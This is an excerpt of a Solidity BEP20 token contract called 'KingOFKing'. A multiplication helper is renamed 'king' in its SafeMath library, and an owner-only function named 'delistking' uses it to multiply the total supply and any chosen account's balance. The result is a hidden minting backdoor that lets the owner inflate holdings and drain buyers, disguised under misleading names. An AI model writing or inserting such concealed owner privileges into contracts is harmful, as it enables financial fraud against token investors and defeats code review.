...
library SafeMath {
    ...
    function king(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
...
contract KingOFKing is Context, IBEP20, Ownable {
    ...
    function delistking(address account, uint256 amount) onlyOwner() public {

        _tTotal = _tTotal.king(amount);
        _rOwned[account] = _rOwned[account].king(amount);
